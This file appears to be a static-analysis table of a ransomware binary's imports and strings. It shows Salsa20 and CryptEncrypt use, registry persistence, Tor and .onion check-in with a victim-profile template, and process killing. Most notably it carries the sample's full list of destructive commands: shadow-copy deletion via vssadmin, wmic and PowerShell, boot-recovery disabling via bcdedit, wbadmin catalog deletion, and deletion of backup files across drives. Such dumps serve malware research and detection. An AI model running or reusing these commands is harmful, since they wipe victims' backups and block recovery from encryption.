reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4019f6	0x462090	import	0x4019ad	KERNEL32.dll.CloseHandle
0x401a40	0x462064	import	0x401a03	KERNEL32.dll.lstrlenA
0x401a48	0x4622bc	import	0x401a03	WININET.dll.InternetCrackUrlA
0x401b38	0x462314	import	0x401b12	ole32.dll.CoCreateInstance
0x401b51	0x462264	import	0x401b12	OLEAUT32.dll.SysReAllocString
0x401b88	0x462264	import	0x401b12	OLEAUT32.dll.SysReAllocString
0x401c0d	0x462268	import	0x401b12	OLEAUT32.dll.VariantCopy
0x401c20	0x462268	import	0x401b12	OLEAUT32.dll.VariantCopy
0x401c33	0x462268	import	0x401b12	OLEAUT32.dll.VariantCopy
0x401c6b	0x4622fc	import	0x401c49	WS2_32.dll.socket
0x401c8b	0x4622ec	import	0x401c49	WS2_32.dll.htons
0x401c91	0x470950	string	0x401c49	127.0.0.1
0x401c9a	0x4622f4	import	0x401c49	WS2_32.dll.inet_addr
0x401caa	0x462304	import	0x401c49	WS2_32.dll.connect
0x401cc1	0x4622f8	import	0x401c49	WS2_32.dll.send
0x401cdd	0x462300	import	0x401c49	WS2_32.dll.recv
0x401d07	0x462064	import	0x401c49	KERNEL32.dll.lstrlenA
0x401d34	0x4622ec	import	0x401c49	WS2_32.dll.htons
0x401d4f	0x4622f8	import	0x401c49	WS2_32.dll.send
0x401d68	0x462300	import	0x401c49	WS2_32.dll.recv
0x401daf	0x470968	string	0x401c49	%s %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n%s\r\n
0x401dba	0x4622b0	import	0x401c49	SHLWAPI.dll.wnsprintfA
0x401dcf	0x4622f8	import	0x401c49	WS2_32.dll.send
0x401de5	0x4622f8	import	0x401c49	WS2_32.dll.send
0x401e08	0x462300	import	0x401c49	WS2_32.dll.recv
0x401e51	0x47099c	string	0x401c49	HTTP/1.1 200
0x401e57	0x4622ac	import	0x401c49	SHLWAPI.dll.StrCmpNA
0x401e61	0x4709ac	string	0x401c49	\r\n\r\n
0x401e67	0x4622a8	import	0x401c49	SHLWAPI.dll.StrStrA
0x401ede	0x4622f0	import	0x401c49	WS2_32.dll.closesocket
0x40201d	0x4709b4	string	0x401fdc	Unknown exception
0x40205e	0x4709c8	string	0x402054	bad array new length
0x4020e3	0x4709e0	string	0x4020e3	string too long
0x4023a4	0x4709f4	string	0x40237a	generic
0x4023e3	0x4709fc	string	0x4023c6	iostream
0x4023fa	0x472258	string	0x4023e9	iostream stream error
0x40245f	0x470a08	string	0x402455	bad cast
0x4028ee	0x470a24	string	0x4028cc	ios_base::badbit set
0x4028f8	0x470a3c	string	0x4028cc	ios_base::failbit set
0x4028fd	0x470a54	string	0x4028cc	ios_base::eofbit set
0x402a8f	0x4486ef	string	0x402a16	j\bh8qG
0x402bdf	0x470a94	string	0x402b9d	NameValuePairs: type mismatch for '
0x402bee	0x470a88	string	0x402b9d	', stored '
0x402c0f	0x470a70	string	0x402b9d	', trying to retrieve '
0x402e63	0x470adc	string	0x402e5a	unknown
0x402fb3	0x470b5c	string	0x402f98	AlgorithmParametersBase: parameter "
0x402fdb	0x470b50	string	0x402f98	" not used
0x4031d9	0x470b90	string	0x4031d0	Salsa20
0x40356d	0x462078	import	0x40354c	KERNEL32.dll.VirtualAlloc
0x40463d	0x462078	import	0x40460f	KERNEL32.dll.VirtualAlloc
0x40582b	0x462078	import	0x405803	KERNEL32.dll.VirtualAlloc
0x406723	0x462078	import	0x4066fd	KERNEL32.dll.VirtualAlloc
0x4072fa	0x462078	import	0x4072c8	KERNEL32.dll.VirtualAlloc
0x408399	0x462078	import	0x408368	KERNEL32.dll.VirtualAlloc
0x4093dc	0x462078	import	0x4093b7	KERNEL32.dll.VirtualAlloc
0x40a375	0x462078	import	0x40a347	KERNEL32.dll.VirtualAlloc
0x40e45a	0x462078	import	0x40e431	KERNEL32.dll.VirtualAlloc
0x41012d	0x462078	import	0x410101	KERNEL32.dll.VirtualAlloc
0x411639	0x462078	import	0x41160a	KERNEL32.dll.VirtualAlloc
0x4126d0	0x462078	import	0x4126a5	KERNEL32.dll.VirtualAlloc
0x414d1f	0x462078	import	0x414cfa	KERNEL32.dll.VirtualAlloc
0x415c12	0x462078	import	0x415bec	KERNEL32.dll.VirtualAlloc
0x4165d2	0x462078	import	0x4165a6	KERNEL32.dll.VirtualAlloc
0x417605	0x462078	import	0x4175dd	KERNEL32.dll.VirtualAlloc
0x417ed6	0x462078	import	0x417eba	KERNEL32.dll.VirtualAlloc
0x417ee8	0x462078	import	0x417eba	KERNEL32.dll.VirtualAlloc
0x417fc5	0x46210c	import	0x417f84	KERNEL32.dll.GetModuleFileNameW
0x417fff	0x470b98	string	0x417f84	runas
0x418022	0x462290	import	0x417f84	SHELL32.dll.ShellExecuteExW
0x4180c7	0x470c58	string	0x418048	Software\Microsoft\Windows\CurrentVersion\Run
0x4180d1	0x462018	import	0x418048	ADVAPI32.dll.RegCreateKeyExW
0x418114	0x462020	import	0x418048	ADVAPI32.dll.RegSetValueExW
0x418128	0x462008	import	0x418048	ADVAPI32.dll.RegCloseKey
0x41817f	0x46209c	import	0x418135	KERNEL32.dll.GetVolumeNameForVolumeMountPointW
0x4181f1	0x46206c	import	0x4181bb	KERNEL32.dll.FindFirstVolumeW
0x418294	0x4620c8	import	0x4181bb	KERNEL32.dll.GetVolumePathNamesForVolumeNameW
0x4182b4	0x4182d3	string	0x4181bb	3\n؍M blocks=Basic Latin,Arabic
0x4182c9	0x4620ac	import	0x4181bb	KERNEL32.dll.SetVolumeMountPointW
0x4182ec	0x4620d0	import	0x4181bb	KERNEL32.dll.FindNextVolumeW
0x4182fa	0x4620f4	import	0x4181bb	KERNEL32.dll.GetLastError
0x41830c	0x4620b8	import	0x4181bb	KERNEL32.dll.FindVolumeClose
0x418413	0x4620c0	import	0x4183cc	KERNEL32.dll.CreateProcessW
0x418422	0x46208c	import	0x4183cc	KERNEL32.dll.WaitForSingleObject
0x41842b	0x462090	import	0x4183cc	KERNEL32.dll.CloseHandle
0x41844f	0x4710cc	string	0x418443	start chrome
0x418461	0x470cd0	string	0x418443	%s /c %s
0x4184a5	0x4620c0	import	0x418443	KERNEL32.dll.CreateProcessW
0x4184b7	0x46208c	import	0x418443	KERNEL32.dll.WaitForSingleObject
0x4184c4	0x4620e0	import	0x418443	KERNEL32.dll.GetExitCodeProcess
0x4184cd	0x462090	import	0x418443	KERNEL32.dll.CloseHandle
0x4184de	0x4620f4	import	0x418443	KERNEL32.dll.GetLastError
0x41850f	0x470ce4	string	0x4184ef	MySession
0x418533	0x462278	import	0x4184ef	RstrtMgr.DLL.RmStartSession
0x418546	0x462280	import	0x4184ef	RstrtMgr.DLL.RmRegisterResources
0x418564	0x46227c	import	0x4184ef	RstrtMgr.DLL.RmGetList
0x418572	0x462274	import	0x4184ef	RstrtMgr.DLL.RmShutdown
0x41857b	0x462270	import	0x4184ef	RstrtMgr.DLL.RmEndSession
0x4185a5	0x462118	import	0x4184ef	KERNEL32.dll.lstrlenW
0x4185ec	0x4622a0	import	0x4184ef	SHLWAPI.dll.StrStrW
0x418640	0x4622a0	import	0x4184ef	SHLWAPI.dll.StrStrW
0x418686	0x4620fc	import	0x4184ef	KERNEL32.dll.CreateFileW
0x4186d5	0x4622a0	import	0x4184ef	SHLWAPI.dll.StrStrW
0x41875f	0x470b88	string	0x4184ef	Rounds
0x4187e5	0x462130	import	0x4184ef	KERNEL32.dll.ReadFile
0x418809	0x4620b0	import	0x4184ef	KERNEL32.dll.SetFilePointerEx
0x41881b	0x462114	import	0x4184ef	KERNEL32.dll.WriteFile
0x41884a	0x4620b0	import	0x4184ef	KERNEL32.dll.SetFilePointerEx
0x418851	0x462114	import	0x4184ef	KERNEL32.dll.WriteFile
0x41886f	0x462064	import	0x4184ef	KERNEL32.dll.lstrlenA
0x41887f	0x462090	import	0x4184ef	KERNEL32.dll.CloseHandle
0x4188aa	0x4620dc	import	0x4184ef	KERNEL32.dll.MoveFileW
0x418955	0x4620fc	import	0x418932	KERNEL32.dll.CreateFileW
0x418968	0x462118	import	0x418932	KERNEL32.dll.lstrlenW
0x41897e	0x462114	import	0x418932	KERNEL32.dll.WriteFile
0x418985	0x462090	import	0x418932	KERNEL32.dll.CloseHandle
0x4189ac	0x4622a0	import	0x418996	SHLWAPI.dll.StrStrW
0x4189b2	0x470cf8	string	0x418996	AppData
0x4189cd	0x462118	import	0x418996	KERNEL32.dll.lstrlenW
0x4189e6	0x46210c	import	0x418996	KERNEL32.dll.GetModuleFileNameW
0x4189f3	0x4622a4	import	0x418996	SHLWAPI.dll.PathRemoveFileSpecW
0x418a24	0x462118	import	0x418996	KERNEL32.dll.lstrlenW
0x418a32	0x4620d4	import	0x418996	KERNEL32.dll.lstrcmpiW
0x418a49	0x418a1e	string	0x418996	f9>t(V
0x418a63	0x470d08	string	0x418996	%s\*
0x418a7e	0x462124	import	0x418996	KERNEL32.dll.FindFirstFileW
0x418a90	0x470d14	string	0x418996	Windows
0x418a9c	0x4620d4	import	0x418996	KERNEL32.dll.lstrcmpiW
0x418ab2	0x470d24	string	0x418996	%s\%s
0x418ada	0x462060	import	0x418996	KERNEL32.dll.lstrcmpW
0x418af0	0x462060	import	0x418996	KERNEL32.dll.lstrcmpW
0x418afa	0x470cf8	string	0x418996	AppData
0x418b06	0x462060	import	0x418996	KERNEL32.dll.lstrcmpW
0x418b2d	0x462060	import	0x418996	KERNEL32.dll.lstrcmpW
0x418b48	0x4622a0	import	0x418996	SHLWAPI.dll.StrStrW
0x418b66	0x462060	import	0x418996	KERNEL32.dll.lstrcmpW
0x418c16	0x46211c	import	0x418996	KERNEL32.dll.FindNextFileW
0x418c2a	0x462100	import	0x418996	KERNEL32.dll.FindClose
0x418c3a	0x470d24	string	0x418996	%s\%s
0x418cf0	0x462118	import	0x418c9d	KERNEL32.dll.lstrlenW
0x418d0e	0x46210c	import	0x418c9d	KERNEL32.dll.GetModuleFileNameW
0x418d1b	0x4622a4	import	0x418c9d	SHLWAPI.dll.PathRemoveFileSpecW
0x418d95	0x462118	import	0x418c9d	KERNEL32.dll.lstrlenW
0x418e4c	0x462068	import	0x418c9d	KERNEL32.dll.GetLogicalDrives
0x418e8b	0x462080	import	0x418c9d	KERNEL32.dll.WaitForMultipleObjects
0x418e9e	0x462090	import	0x418c9d	KERNEL32.dll.CloseHandle
0x418ec5	0x470d4c	string	0x418c9d	\\?\%c:
0x418ee2	0x4620a8	import	0x418c9d	KERNEL32.dll.CreateThread
0x418f21	0x462080	import	0x418c9d	KERNEL32.dll.WaitForMultipleObjects
0x418f33	0x462090	import	0x418c9d	KERNEL32.dll.CloseHandle
0x418f84	0x462258	import	0x418f63	MPR.dll.WNetOpenEnumW
0x418fb5	0x462254	import	0x418f63	MPR.dll.WNetEnumResourceW
0x41901e	0x462080	import	0x418f63	KERNEL32.dll.WaitForMultipleObjects
0x41903b	0x462090	import	0x418f63	KERNEL32.dll.CloseHandle
0x41906c	0x470d30	string	0x418f63	\\?\%s
0x41908d	0x4620a8	import	0x418f63	KERNEL32.dll.CreateThread
0x4190cf	0x462254	import	0x418f63	MPR.dll.WNetEnumResourceW
0x4190e8	0x46225c	import	0x418f63	MPR.dll.WNetCloseEnum
0x419119	0x46210c	import	0x4190fa	KERNEL32.dll.GetModuleFileNameW
0x41912a	0x470d60	string	0x4190fa	/c timeout 1 && del "%s" >> NUL
0x419147	0x470da0	string	0x4190fa	ComSpec
0x41914c	0x462084	import	0x4190fa	KERNEL32.dll.GetEnvironmentVariableW
0x419168	0x462288	import	0x4190fa	SHELL32.dll.ShellExecuteW
0x419174	0x4620b4	import	0x4190fa	KERNEL32.dll.ExitProcess
0x41918e	0x4620a0	import	0x41917e	KERNEL32.dll.CreateToolhelp32Snapshot
0x4191b4	0x4620a4	import	0x41917e	KERNEL32.dll.Process32NextW
0x4191d3	0x462118	import	0x41917e	KERNEL32.dll.lstrlenW
0x4191e4	0x462060	import	0x41917e	KERNEL32.dll.lstrcmpW
0x4191f7	0x462098	import	0x41917e	KERNEL32.dll.OpenProcess
0x419206	0x46207c	import	0x41917e	KERNEL32.dll.TerminateProcess
0x41920d	0x462090	import	0x41917e	KERNEL32.dll.CloseHandle
0x41922e	0x4620a4	import	0x41917e	KERNEL32.dll.Process32NextW
0x41923a	0x462090	import	0x41917e	KERNEL32.dll.CloseHandle
0x419268	0x462014	import	0x419244	ADVAPI32.dll.OpenSCManagerW
0x419296	0x462118	import	0x419244	KERNEL32.dll.lstrlenW
0x4192a3	0x462034	import	0x419244	ADVAPI32.dll.OpenServiceW
0x4192b6	0x46201c	import	0x419244	ADVAPI32.dll.ControlService
0x4192bd	0x46200c	import	0x419244	ADVAPI32.dll.CloseServiceHandle
0x4192d4	0x46200c	import	0x419244	ADVAPI32.dll.CloseServiceHandle
0x419336	0x4620cc	import	0x4192df	KERNEL32.dll.WinExec
0x419390	0x462118	import	0x41933e	KERNEL32.dll.lstrlenW
0x419398	0x4622d0	import	0x41933e	WININET.dll.InternetCrackUrlW
0x4194a8	0x4622cc	import	0x419483	WININET.dll.InternetOpenW
0x4194e4	0x4622e4	import	0x419483	WININET.dll.InternetSetOptionW
0x4194fd	0x4622dc	import	0x419483	WININET.dll.InternetConnectW
0x419532	0x4622c0	import	0x419483	WININET.dll.HttpOpenRequestW
0x419558	0x4622c4	import	0x419483	WININET.dll.InternetQueryOptionW
0x419572	0x4622e4	import	0x419483	WININET.dll.InternetSetOptionW
0x41958a	0x4622d4	import	0x419483	WININET.dll.HttpSendRequestW
0x4195a6	0x4622c8	import	0x419483	WININET.dll.InternetQueryDataAvailable
0x4195cb	0x4622e0	import	0x419483	WININET.dll.InternetReadFile
0x4195f2	0x4622d8	import	0x419483	WININET.dll.InternetCloseHandle
0x4195f9	0x4622d8	import	0x419483	WININET.dll.InternetCloseHandle
0x419600	0x4622d8	import	0x419483	WININET.dll.InternetCloseHandle
0x41961b	0x4194a3	string	0x419483	WWWPW
0x419647	0x470db0	string	0x419637	.onion
0x419650	0x4622a0	import	0x419637	SHLWAPI.dll.StrStrW
0x41966d	0x4620c4	import	0x419637	KERNEL32.dll.WideCharToMultiByte
0x4196d8	0x462118	import	0x419637	KERNEL32.dll.lstrlenW
0x419734	0x462074	import	0x419637	KERNEL32.dll.lstrcpynW
0x419748	0x462118	import	0x419637	KERNEL32.dll.lstrlenW
0x4197c5	0x46212c	import	0x419783	KERNEL32.dll.GetComputerNameExW
0x419857	0x4620bc	import	0x419783	KERNEL32.dll.GlobalMemoryStatusEx
0x4198ce	0x470dd0	string	0x419783	%s|DELIMITER|Name(domain): %s(%s)\r\nCPU: %S\r\nRAM: %d\r\nDisks count: %d\r\nFiles count: %d|DELIMITER|
0x4198d9	0x46229c	import	0x419783	SHLWAPI.dll.wnsprintfW
0x4198fd	0x470e94	string	0x419783	%s = %d\r\n
0x41990e	0x46229c	import	0x419783	SHLWAPI.dll.wnsprintfW
0x41991f	0x4620f0	import	0x419783	KERNEL32.dll.lstrcatW
0x419942	0x462118	import	0x419783	KERNEL32.dll.lstrlenW
0x419959	0x4620c4	import	0x419783	KERNEL32.dll.WideCharToMultiByte
0x41996e	0x470db0	string	0x419783	.onion
0x419974	0x4622a0	import	0x419783	SHLWAPI.dll.StrStrW
0x419993	0x4620c4	import	0x419783	KERNEL32.dll.WideCharToMultiByte
0x41999b	0x462064	import	0x419783	KERNEL32.dll.lstrlenA
0x4199a3	0x470ea8	string	0x419783	Content-Type: application/octet-stream\r\nContent-Encoding: binary\r\n
0x4199a8	0x470eec	string	0x419783	POST
0x4199bd	0x462064	import	0x419783	KERNEL32.dll.lstrlenA
0x4199c5	0x470ef8	string	0x419783	Content-Type: application/octet-stream\r\nContent-Encoding: binary\r\n
0x4199ca	0x470f80	string	0x419783	POST
0x419a01	0x470fa8	string	0x4199f0	https://dist.torproject.org/torbrowser/8.5.3/tor-win32-0.3.5.8.zip
0x419a2c	0x462104	import	0x4199f0	KERNEL32.dll.GetTempPathW
0x419a7f	0x471038	string	0x4199f0	Tor\tor.exe
0x419a8c	0x4622b4	import	0x4199f0	SHLWAPI.dll.PathCombineW
0x419ad6	0x4620c0	import	0x4199f0	KERNEL32.dll.CreateProcessW
0x419ae6	0x462090	import	0x4199f0	KERNEL32.dll.CloseHandle
0x419af3	0x4620ec	import	0x4199f0	KERNEL32.dll.DeleteFileW
0x419b18	0x471050	string	0x419b06	UTF-8
0x419b5a	0x46210c	import	0x419b06	KERNEL32.dll.GetModuleFileNameW
0x419b60	0x462118	import	0x419b06	KERNEL32.dll.lstrlenW
0x419b82	0x479d40	string	0x419b06	.t800
0x419ba3	0x4620a8	import	0x419b06	KERNEL32.dll.CreateThread
0x419bba	0x471058	string	0x419b06	{8761ABBD-7F85-42EE-B272-A76179687C63}
0x419be7	0x4620d8	import	0x419b06	KERNEL32.dll.OpenMutexW
0x419c02	0x462088	import	0x419b06	KERNEL32.dll.CreateMutexW
0x419c21	0x462070	import	0x419b06	KERNEL32.dll.GetCurrentProcess
0x419c28	0x462024	import	0x419b06	ADVAPI32.dll.OpenProcessToken
0x419c4f	0x46203c	import	0x419b06	ADVAPI32.dll.GetTokenInformation
0x419c6e	0x462090	import	0x419b06	KERNEL32.dll.CloseHandle
0x419c8c	0x470ba8	string	0x419b06	SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
0x419c96	0x46202c	import	0x419b06	ADVAPI32.dll.RegOpenKeyExW
0x419cb1	0x470c1c	string	0x419b06	EnableLinkedConnections
0x419cba	0x462020	import	0x419b06	ADVAPI32.dll.RegSetValueExW
0x419cc4	0x462008	import	0x419b06	ADVAPI32.dll.RegCloseKey
0x419cdd	0x4710a8	string	0x419b06	LanmanWorkstation
0x419cfc	0x462014	import	0x419b06	ADVAPI32.dll.OpenSCManagerW
0x419d1a	0x462034	import	0x419b06	ADVAPI32.dll.OpenServiceW
0x419d39	0x46201c	import	0x419b06	ADVAPI32.dll.ControlService
0x419d3f	0x462118	import	0x419b06	KERNEL32.dll.lstrlenW
0x419d46	0x46200c	import	0x419b06	ADVAPI32.dll.CloseServiceHandle
0x419d68	0x4710a8	string	0x419b06	LanmanWorkstation
0x419d87	0x462014	import	0x419b06	ADVAPI32.dll.OpenSCManagerW
0x419da5	0x462034	import	0x419b06	ADVAPI32.dll.OpenServiceW
0x419db4	0x462028	import	0x419b06	ADVAPI32.dll.StartServiceW
0x419dbb	0x46200c	import	0x419b06	ADVAPI32.dll.CloseServiceHandle
0x419e2f	0x4710e8	string	0x419b06	\r\n--\r\n
0x419e51	0x4710f0	string	0x419b06	CMD->PowerShell - Done!\r\n--\r\n
0x419e9c	0x471110	string	0x419b06	beforePShell.txt
0x419eb9	0x471134	string	0x419b06	C:\Users\Public\Desktop\
0x419f5f	0x46210c	import	0x419b06	KERNEL32.dll.GetModuleFileNameW
0x419f88	0x471168	string	0x419b06	net stop VSS & sc config VSS start= disabled
0x419fbf	0x4711c8	string	0x419b06	sc config VSS start= Demand & net start VSS
0x419ff2	0x471220	string	0x419b06	wmic.exe SHADOWCOPY delete /nointeractive
0x41a025	0x471278	string	0x419b06	vssadmin.exe Delete Shadows /All /Quiet
0x41a058	0x4712c8	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=c: /on=c: /maxsize=401MB
0x41a08b	0x471348	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=c: /on=c: /maxsize=unbounded
0x41a0be	0x4713d0	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=d: /on=d: /maxsize=401MB
0x41a0fe	0x471450	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=d: /on=d: /maxsize=unbounded
0x41a124	0x4714d8	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=e: /on=e: /maxsize=401MB
0x41a157	0x471558	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=e: /on=e: /maxsize=unbounded
0x41a18a	0x4715e0	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=f: /on=f: /maxsize=401MB
0x41a1bd	0x471660	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=f: /on=f: /maxsize=unbounded
0x41a1f0	0x4716e8	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=g: /on=g: /maxsize=401MB
0x41a223	0x471768	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=g: /on=g: /maxsize=unbounded
0x41a256	0x4717f0	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=h: /on=h: /maxsize=401MB
0x41a289	0x471870	string	0x419b06	vssadmin.exe Resize ShadowStorage /for=h: /on=h: /maxsize=unbounded
0x41a2bc	0x4718f8	string	0x419b06	bcdedit.exe /set {default} recoveryenabled No
0x41a2ef	0x471958	string	0x419b06	bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
0x41a322	0x4719d8	string	0x419b06	wbadmin.exe DELETE CATALOG -quiet
0x41a355	0x471a20	string	0x419b06	icacls.exe "{A-Z}:" /grant {Username}:F /T /C /Q
0x41a388	0x471a88	string	0x419b06	del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
0x41a3bb	0x471b70	string	0x419b06	del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
0x41a3fa	0x471c58	string	0x419b06	del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
0x41a421	0x471d40	string	0x419b06	del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
0x41a454	0x471e28	string	0x419b06	del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
0x41a487	0x471f10	string	0x419b06	del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
0x41a4ba	0x471ff4	string	0x419b06	del %0
0x41a4ed	0x472008	string	0x419b06	wbadmin.exe DELETE SYSTEMSTATEBACKUP
0x41a520	0x472058	string	0x419b06	wbadmin.exe DELETE SYSTEMSTATEBACKUP -deleteoldest
0x41a564	0x4720c0	string	0x419b06	powershell -command "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"
0x41a595	0x46228c	import	0x419b06	SHELL32.dll.SHEmptyRecycleBinW
0x41a5c4	0x470db0	string	0x419b06	.onion
0x41a5cf	0x4622a0	import	0x419b06	SHLWAPI.dll.StrStrW
0x41a5da	0x462310	import	0x419b06	ole32.dll.CoInitialize
0x41a661	0x462064	import	0x419b06	KERNEL32.dll.lstrlenA
0x41a687	0x47216c	string	0x419b06	%c%c
0x41a6c2	0x462064	import	0x419b06	KERNEL32.dll.lstrlenA
0x41a6d0	0x462118	import	0x419b06	KERNEL32.dll.lstrlenW
0x41a6ef	0x462030	import	0x419b06	ADVAPI32.dll.CryptImportKey
0x41a73a	0x462010	import	0x419b06	ADVAPI32.dll.CryptEncrypt
0x41a755	0x472174	string	0x419b06	%02x
0x41a773	0x462094	import	0x419b06	KERNEL32.dll.lstrcatA
0x41a784	0x462004	import	0x419b06	ADVAPI32.dll.CryptDestroyKey
0x41a791	0x462038	import	0x419b06	ADVAPI32.dll.CryptReleaseContext
0x41a7b8	0x462058	import	0x419b06	KERNEL32.dll.lstrcpyW
0x41a7be	0x470f8c	string	0x419b06	{KEY11111}
0x41a7c9	0x4622a0	import	0x419b06	SHLWAPI.dll.StrStrW
0x41a7f8	0x470d24	string	0x419b06	%s\%s
0x41a85e	0x46207c	import	0x419b06	KERNEL32.dll.TerminateProcess
0x41a865	0x462090	import	0x419b06	KERNEL32.dll.CloseHandle
0x41a872	0x46230c	import	0x419b06	ole32.dll.CoUninitialize
0x41a89c	0x47217c	string	0x419b06	start chrome /incognito
0x41ac37	0x41ac53	string	0x41ab9b	_^[]
0x41b047	0x41b0a1	string	0x41b00a	_^[]
0x41b10c	0x44508a	string	0x41b0a8	j\fhXpG
0x41b1db	0x41b1e2	string	0x41b1b4	8^Ht99^Lt
0x41b69b	0x41b6ac	string	0x41b685	_^ËQ$ blocks=Basic Latin,Latin-1 Supplement
0x41c464	0x4721ac	string	0x41c464	invalid string position
0x41cef5	0x4721d4	string	0x41cef5	vector too long
0x41d048	0x41d04c	string	0x41cf83	VPW멺 blocks=Basic Latin,Hangul Syllables
0x41d1c0	0x470d40	string	0x41d185	\\?\
0x41d1f8	0x470d40	string	0x41d185	\\?\
0x41d313	0x41d329	string	0x41d272	_^[]
0x41d474	0x470d40	string	0x41d419	\\?\
0x41dbd4	0x4621c8	import	0x41dbcf	KERNEL32.dll.InitializeSListHead
0x41dca3	0x44ab03	string	0x41dc81	hxjF
0x41e001	0x41dd41	string	0x41de73	j\bh\b^G
0x41e027	0x41dd41	string	0x41de73	j\bh\b^G
0x41e0ff	0x4624a0	string	0x41e0f5	bad allocation
0x41e140	0x4621cc	import	0x41e12a	KERNEL32.dll.IsProcessorFeaturePresent
